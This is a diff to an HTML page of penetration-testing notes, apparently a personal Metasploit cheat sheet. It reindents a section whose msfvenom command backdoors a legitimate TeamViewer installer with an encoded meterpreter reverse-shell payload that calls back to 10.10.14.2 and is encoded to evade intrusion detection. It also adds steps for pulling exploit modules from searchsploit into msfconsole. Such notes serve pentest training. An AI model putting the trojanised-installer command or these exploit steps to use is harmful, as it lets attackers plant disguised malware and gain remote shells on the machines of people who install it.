@@ -106,9 +106,21 @@ exploit exploit -j -z</code></pre>
 
             <h2>Embed malicious code into file</h2>
             <ul>
-            <p>In order to avoid IDS you can take a legit file and embed malicious code</p>
-            <pre><code class="language-bash">msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5</code></pre>
-            </ul>    
+                <p>In order to avoid IDS you can take a legit file and embed malicious code</p>
+                <pre><code class="language-bash">msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5</code></pre>
+            </ul>
+            
+            <h2>Importing modules</h2>
+            <ul>
+                <p>Find the module through searchsploit and grab it using -m</p>
+                <pre><code class="language-bash">searchsploit -m multiple/webapps/12345.py</code></pre>
+                <p>Then copy the module into the following folder</p>
+                <pre><code class="language-bash">cp 12345.py /usr/share/metasploit-framework/modules/exploits</code></pre>
+                <p>Start msfconsole and reload modules using</p>
+                <pre><code class="language-bash">run reload_all</code></pre>
+                <p>Finally use the module</p>
+                <pre><code class="language-bash">use exploit/12345.rb</code></pre>
+            </ul>
         </div>
     </div>
 </body>
